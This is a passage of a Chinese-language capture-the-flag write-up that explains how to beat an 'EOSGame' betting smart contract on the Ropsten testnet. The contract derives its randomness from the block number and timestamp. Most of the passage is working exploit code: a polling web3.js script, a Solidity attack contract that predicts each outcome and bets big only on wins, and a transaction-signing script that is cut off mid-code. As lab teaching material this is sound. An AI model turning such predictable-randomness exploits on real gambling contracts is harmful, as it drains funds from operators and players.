class="line">&#125;);</span><br><span class="line">listener.on(<span class="hljs-string">'data'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>)</span>&#123;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"recv event data: "</span>)</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(event);</span><br><span class="line">&#125;)</span><br><span class="line">.on(<span class="hljs-string">'error'</span>, <span class="hljs-built_in">console</span>.error);</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exploit</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line">    getshark().then(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;</span><br><span class="line">        getlucky_hash().then(<span class="hljs-function"><span class="hljs-params">ress</span> =&gt;</span> &#123;</span><br><span class="line">            EOSGameContract.methods.eosBlanceOf().call(&#123;</span><br><span class="line">                <span class="hljs-keyword">from</span>: fromAddress</span><br><span class="line">            &#125;, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, result</span>) </span>&#123;</span><br><span class="line">                <span class="hljs-keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="hljs-keyword">throw</span> err;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"eosBlanceOf result: "</span> + result)</span><br><span class="line">            &#125;)</span><br><span class="line">            <span class="hljs-keyword">if</span> (res == ress) &#123;</span><br><span class="line">                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"\n===================this is time!!!===================\n"</span>);</span><br><span class="line">                smallBlind();</span><br><span class="line">            &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"\n===================it is not time!!!===================\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-comment">// smallBlind();</span></span><br><span class="line">setInterval(<span class="hljs-function"><span class="hljs-params">nonce</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"going...."</span>);</span><br><span class="line">    exploit();</span><br><span class="line">&#125;, <span class="hljs-number">2500</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// setInterval(nonce =&gt; &#123;</span></span><br><span class="line"><span class="hljs-comment">//     console.log("going....");</span></span><br><span class="line"><span class="hljs-comment">//     smallBlind();</span></span><br><span class="line"><span class="hljs-comment">// &#125;, 3000);</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// setInterval(nonce =&gt; &#123;</span></span><br><span class="line"><span class="hljs-comment">//     console.log("going....");</span></span><br><span class="line"><span class="hljs-comment">//     getshark().then(res =&gt; &#123;</span></span><br><span class="line"><span class="hljs-comment">//         console.log(res);</span></span><br><span class="line"><span class="hljs-comment">//     &#125;)</span></span><br><span class="line"><span class="hljs-comment">// &#125;, 3000);</span></span><br></pre></td></tr></table></figure><h3 id="攻击合约攻击"><a href="#攻击合约攻击" class="headerlink" title="攻击合约攻击"></a>攻击合约攻击</h3><p>&emsp;&emsp;当然另一种攻击方式是自己在<code>ropsten</code>上部署攻击合约，以合约调用合约的方式进行攻击，那样就免去了使用蹩脚的<code>web3js</code>进行相关的运算，不用担心计算结果、类型。另一个就是在合约中调用其他合约是立即生效的，而不能等交易被挖出确认。你只需要在A –&gt; B时支付你调用A的账单，在A调用B时是类似于我们的函数调用，不再需要发起交易。</p><p>&emsp;&emsp;而且可以看到<code>EOSGame</code>里使用了<code>tx.origin</code>作为账号，而关于<code>tx.origin</code>和<code>msg.sender</code>的区别是<code>sender</code>是合约的<code>直接上级</code>，可以是用户，也可以是另一个合约，而<code>origin</code>只能是用户。如：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user ---&gt; contract A ---&gt; contract B ---&gt; contract C</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;对于任一个合约的origin都是user，但contract B的sender是contract A。</p><p>&emsp;&emsp;因为我们的攻击合约函数需要改变合约的内容，所以我们不要在攻击函数中加<code>view</code>。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在Solidity中view函数修饰词的作用是告诉编译器，函数不改变只读取状态变量。</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;详细的代码在下面，如果是账号第一次赌就需要<code>toinit</code>一下，在攻击代码中同时使用了<code>bigBlind</code>和<code>smallBlind</code>，在不正确的时候下小注，正确时下大注，以增加自己的几率，毕竟小赌一次可以改变自己的<code>lucky_hash</code>。但这里的<code>for循环</code>被我调到了100，因为测试发现上1000+所需要的gas很大，容易<code>Out of gas</code>。（当然也可以碰运气。。）</p><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.24</span>;</span><br><span class="line"></span><br><span class="line">contract EOSGame &#123;</span><br><span class="line">    mapping(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> uint256) public bet_count;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">smallBlind</span>(<span class="hljs-params"></span>);</span></span><br><span class="line"><span class="hljs-function">    <span class="hljs-title">function</span> <span class="hljs-title">bigBlind</span>(<span class="hljs-params"></span>);</span></span><br><span class="line"><span class="hljs-function">    <span class="hljs-title">function</span> <span class="hljs-title">CaptureTheFlag</span>(<span class="hljs-params">string b64email</span>);</span></span><br><span class="line"><span class="hljs-function">    <span class="hljs-title">function</span> <span class="hljs-title">eosBlanceOf</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span>(<span class="hljs-params">uint256</span>);</span></span><br><span class="line"><span class="hljs-function">    <span class="hljs-title">function</span> <span class="hljs-title">initFund</span>(<span class="hljs-params"></span>);</span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function">&#125;</span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-title">contract</span> <span class="hljs-title">AttackGame</span> </span>&#123;</span><br><span class="line">    uint256 MOD_NUM = <span class="hljs-number">20</span>;</span><br><span class="line">    address public gameAddr = <span class="hljs-number">0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F</span>;</span><br><span class="line">    EOSGame mime = EOSGame(gameAddr);</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getmyblance</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> mime.eosBlanceOf();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toinit</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>&#123;</span><br><span class="line">        mime.initFund();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getbet_count</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> mime.bet_count(tx.origin);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myshark</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span>(<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">        uint number = block.number;</span><br><span class="line">        uint timestamp = block.timestamp;</span><br><span class="line">        </span><br><span class="line">        uint256 seed = uint256(keccak256(abi.encodePacked(number)))+uint256(keccak256(abi.encodePacked(timestamp)));</span><br><span class="line">        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));</span><br><span class="line">        uint256 shark = seed_hash % MOD_NUM;</span><br><span class="line">        <span class="hljs-keyword">return</span> shark;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mylucky</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>&#123;</span><br><span class="line">        uint256 lucky_hash = uint256(keccak256(abi.encodePacked(getbet_count())));</span><br><span class="line">        uint256 lucky = lucky_hash % MOD_NUM;</span><br><span class="line">        <span class="hljs-keyword">return</span> lucky;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">tryonce</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">returns</span> (<span class="hljs-params">string</span>) </span>&#123;</span><br><span class="line">        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));</span><br><span class="line">        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));</span><br><span class="line">        uint256 shark = seed_hash % MOD_NUM;</span><br><span class="line">        </span><br><span class="line">        uint256 lucky_hash = uint256(keccak256(abi.encodePacked(getbet_count())));</span><br><span class="line">        uint256 lucky = lucky_hash % MOD_NUM;</span><br><span class="line">        </span><br><span class="line">        <span class="hljs-keyword">if</span> (shark == lucky)&#123;</span><br><span class="line">            mime.bigBlind();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">if</span> (getmyblance() &gt; <span class="hljs-number">1000</span>) &#123;</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-string">"success!!!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-string">"fail!!!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dotentimes</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>&#123;</span><br><span class="line">        uint16 i;</span><br><span class="line">        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;</span><br><span class="line">            mime.smallBlind();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myattack</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">returns</span> (<span class="hljs-params">string</span>) </span>&#123;</span><br><span class="line">        uint16 i;</span><br><span class="line">        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;</span><br><span class="line">            uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));</span><br><span class="line">            uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));</span><br><span class="line">            uint256 shark = seed_hash % MOD_NUM;</span><br><span class="line">            </span><br><span class="line">            uint256 lucky_hash = uint256(keccak256(abi.encodePacked(getbet_count())));</span><br><span class="line">            uint256 lucky = lucky_hash % MOD_NUM;</span><br><span class="line">            </span><br><span class="line">            <span class="hljs-keyword">if</span> (shark == lucky)&#123;</span><br><span class="line">                mime.bigBlind();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                mime.smallBlind();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这里所有的调试都可以使用<code>remix-ide</code>，它提供了本地VM和部署到Ropsten链上去的方式。</p><p>&emsp;&emsp;还一个选择就是将这个合约部署上ropsten后写一个js调用进行攻击。</p><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> Web3 = <span class="hljs-built_in">require</span>(<span class="hljs-string">"web3"</span>);</span><br><span class="line"><span class="hljs-keyword">let</span> Tx = <span class="hljs-built_in">require</span>(<span class="hljs-string">'ethereumjs-tx'</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> BigNumber = <span class="hljs-built_in">require</span>(<span class="hljs-string">'bignumber.js'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> fromAddress = <span class="hljs-string">"0x527e6be04exxxx"</span>;</span><br><span class="line"><span class="hljs-comment">// 合约地址</span></span><br><span class="line"><span class="hljs-keyword">let</span> contractAddress = <span class="hljs-string">"0xc63766717881e05b1d344fb2076ca73aacb2ab91"</span>;</span><br><span class="line"><span class="hljs-comment">// 创建web3对象</span></span><br><span class="line"><span class="hljs-keyword">let</span> web3 = <span class="hljs-keyword">new</span> Web3();</span><br><span class="line"><span class="hljs-comment">// 连接到 ropsten 测试节点</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> INFURA_API_KEY = <span class="hljs-string">"9762c5d2xxxx"</span></span><br><span class="line"><span class="hljs-keyword">let</span> ROPSTEN_URL = <span class="hljs-string">"https://ropsten.infura.io/"</span> + INFURA_API_KEY</span><br><span class="line">local = <span class="hljs-string">'http://192.168.142.145:8545'</span></span><br><span class="line">web3.setProvider(<span class="hljs-keyword">new</span> Web3.providers.HttpProvider(ROPSTEN_URL))</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> abi = [&#123;</span><br><span class="line">        <span class="hljs-string">"constant"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">        <span class="hljs-string">"inputs"</span>: [],</span><br><span class="line">        <span class="hljs-string">"name"</span>: <span class="hljs-string">"dotentimes"</span>,</span><br><span class="line">        <span class="hljs-string">"outputs"</span>: [],</span><br><span class="line">        <span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">        <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"nonpayable"</span>,</span><br><span class="line">        <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-string">"constant"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">        <span class="hljs-string">"inputs"</span>: [],</span><br><span class="line">        <span class="hljs-string">"name"</span>: <span class="hljs-string">"myattack"</span>,</span><br><span class="line">        <span class="hljs-string">"outputs"</span>: [&#123;</span><br><span class="line">            <span class="hljs-string">"name"</span>: <span class="hljs-string">""</span>,</span><br><span class="line">            <span class="hljs-string">"type"</span>: <span class="hljs-string">"string"</span></span><br><span class="line">        &#125;],</span><br><span class="line">        <span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">        <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"nonpayable"</span>,</span><br><span class="line">        <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-string">"constant"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">        <span class="hljs-string">"inputs"</span>: [],</span><br><span class="line">        <span class="hljs-string">"name"</span>: <span class="hljs-string">"toinit"</span>,</span><br><span class="line">        <span class="hljs-string">"outputs"</span>: [],</span><br><span class="line">        <span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">        <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"nonpayable"</span>,</span><br><span class="line">        <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-string">"constant"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">        <span class="hljs-string">"inputs"</span>: [],</span><br><span class="line">        <span class="hljs-string">"name"</span>: <span class="hljs-string">"tryonce"</span>,</span><br><span class="line">        <span class="hljs-string">"outputs"</span>: [&#123;</span><br><span class="line">            <span class="hljs-string">"name"</span>: <span class="hljs-string">""</span>,</span><br><span class="line">            <span class="hljs-string">"type"</span>: <span class="hljs-string">"string"</span></span><br><span class="line">        &#125;],</span><br><span class="line">        <span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">        <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"nonpayable"</span>,</span><br><span class="line">        <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-string">"constant"</span>: <span class="hljs-literal">true</span>,</span><br><span class="line">        <span class="hljs-string">"inputs"</span>: [],</span><br><span class="line">        <span class="hljs-string">"name"</span>: <span class="hljs-string">"gameAddr"</span>,</span><br><span class="line">        <span class="hljs-string">"outputs"</span>: [&#123;</span><br><span class="line">            <span class="hljs-string">"name"</span>: <span class="hljs-string">""</span>,</span><br><span class="line">            <span class="hljs-string">"type"</span>: <span class="hljs-string">"address"</span></span><br><span class="line">        &#125;],</span><br><span class="line">        <span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">        <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"view"</span>,</span><br><span class="line">        <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-string">"constant"</span>: <span class="hljs-literal">true</span>,</span><br><span class="line">        <span class="hljs-string">"inputs"</span>: [],</span><br><span class="line">        <span class="hljs-string">"name"</span>: <span class="hljs-string">"getbet_count"</span>,</span><br><span class="line">        <span class="hljs-string">"outputs"</span>: [&#123;</span><br><span class="line">            <span class="hljs-string">"name"</span>: <span class="hljs-string">""</span>,</span><br><span class="line">            <span class="hljs-string">"type"</span>: <span class="hljs-string">"uint256"</span></span><br><span class="line">        &#125;],</span><br><span class="line">        <span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">        <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"view"</span>,</span><br><span class="line">        <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-string">"constant"</span>: <span class="hljs-literal">true</span>,</span><br><span class="line">        <span class="hljs-string">"inputs"</span>: [],</span><br><span class="line">        <span class="hljs-string">"name"</span>: <span class="hljs-string">"getmyblance"</span>,</span><br><span class="line">        <span class="hljs-string">"outputs"</span>: [&#123;</span><br><span class="line">            <span class="hljs-string">"name"</span>: <span class="hljs-string">""</span>,</span><br><span class="line">            <span class="hljs-string">"type"</span>: <span class="hljs-string">"uint256"</span></span><br><span class="line">        &#125;],</span><br><span class="line">        <span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">        <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"view"</span>,</span><br><span class="line">        <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-string">"constant"</span>: <span class="hljs-literal">true</span>,</span><br><span class="line">        <span class="hljs-string">"inputs"</span>: [],</span><br><span class="line">        <span class="hljs-string">"name"</span>: <span class="hljs-string">"mylucky"</span>,</span><br><span class="line">        <span class="hljs-string">"outputs"</span>: [&#123;</span><br><span class="line">            <span class="hljs-string">"name"</span>: <span class="hljs-string">""</span>,</span><br><span class="line">            <span class="hljs-string">"type"</span>: <span class="hljs-string">"uint256"</span></span><br><span class="line">        &#125;],</span><br><span class="line">        <span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">        <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"view"</span>,</span><br><span class="line">        <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-string">"constant"</span>: <span class="hljs-literal">true</span>,</span><br><span class="line">        <span class="hljs-string">"inputs"</span>: [],</span><br><span class="line">        <span class="hljs-string">"name"</span>: <span class="hljs-string">"myshark"</span>,</span><br><span class="line">        <span class="hljs-string">"outputs"</span>: [&#123;</span><br><span class="line">            <span class="hljs-string">"name"</span>: <span class="hljs-string">""</span>,</span><br><span class="line">            <span class="hljs-string">"type"</span>: <span class="hljs-string">"uint256"</span></span><br><span class="line">        &#125;],</span><br><span class="line">        <span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">        <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"view"</span>,</span><br><span class="line">        <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> cango = <span class="hljs-literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendSigned</span>(<span class="hljs-params">txData</span>) </span>&#123;</span><br><span class="line">    web3.eth.accounts.signTransaction(txData, <span class="hljs-string">'0x6c3xxxx'</span>)</span><br><span class="line">        .then(<span class="hljs-function"><span class="hljs-params">RLPencodedTx</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="hljs-keyword">let</span> transact = web3.eth.sendSignedTransaction(RLPencodedTx[<span class="hljs-string">'rawTransaction'</span>]);</span><br><span class="line">            cango = <span class="hljs-literal">true</span>;</span><br><span class="line">            transact.on(<span class="hljs-string">'confirmation'</span>, (confirmationNumber, receipt) =&gt; &#123;</span><br><span class="line">                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'confirmation'</span>, confirmationNumber);</span><br><span class="line">                <span class="hljs-keyword">if</span> (confirmationNumber == <span class="hljs-string">'24'</span>) &#123;</span><br><span class="line">                    cango = <span class="hljs-literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            transact.on(<span class="hljs-string">'transactionHash'</span>, hash =&gt; &#123;</span><br><span class="line">                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'hash'</span>, hash);</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            transact.on(<span class="hljs-string">'receipt'</span>, receipt =&gt; &#123;</span><br><span class="line">                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'reciept'</span>, receipt);</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            transact.on(<span class="hljs-string">'error'</span>, res =&gt; &#123;</span><br><span class="line">                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'error...'</span>);</span><br><span class="line">                cango = <span class="hljs-literal">true</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> txData = &#123;</span><br><span class="line"> 